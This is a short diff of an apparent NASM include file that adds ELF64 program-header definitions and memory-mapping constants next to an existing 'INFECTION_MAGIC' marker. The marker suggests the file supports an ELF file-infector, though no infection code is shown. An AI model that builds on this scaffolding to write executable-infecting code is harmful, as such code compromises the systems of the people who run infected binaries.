@@ -27,6 +27,7 @@
 
 %define MAP_PRIVATE     0x02
 %define MAP_SHARED      0x01
+%define MAP_ANONYMOUS   0x20
 
 %define MS_SYNC         0x04
 
@@ -69,6 +70,22 @@ endstruc
 %define ET_EXEC         2
 %define ET_DYN          3
 %define EI_PAD          9
+
+struc       Elf64_Phdr
+    p_type:         resd    1
+    p_flags:        resd    1
+    p_offset:       resq    1
+    p_vaddr:        resq    1
+    p_paddr:        resq    1
+    p_filesz:       resq    1
+    p_memsz:        resq    1
+    p_align:        resq    1
+endstruc
+
+%define PT_LOAD         1
+%define PF_X            (1 << 0)
+%define PF_W            (1 << 1)
+%define PF_R            (1 << 2)
 
 %define INFECTION_MAGIC 0xcafefeed
 
